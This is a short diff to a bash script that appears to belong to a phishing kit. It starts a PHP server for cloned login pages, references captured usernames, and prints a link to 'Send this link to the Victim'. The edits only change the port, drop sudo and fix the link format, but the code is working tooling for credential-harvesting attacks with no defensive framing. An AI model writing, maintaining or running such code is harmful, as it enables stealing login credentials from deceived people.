@@ -376,14 +376,14 @@ rm -rf sites/$server/usernames.txt
 
 fi
 
-default_ip=$(hostname -I)
+default_ip=$(hostname -i)
 printf "\e[1;92m[\e[0m*\e[1;92m] Put your local IP (Default %s): " $default_ip
 read ip
 ip="${ip:-${default_ip}}"
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
-sudo php -t "sites/$server" -S "$ip:80" > /dev/null 2>&1 & 
+php -t "sites/$server" -S "$ip:8080" > /dev/null 2>&1 & 
 sleep 2
-printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" $ip
+printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m http://%s:8080\e[0m\n" $ip
 checkfound
 }
 checkfound() {
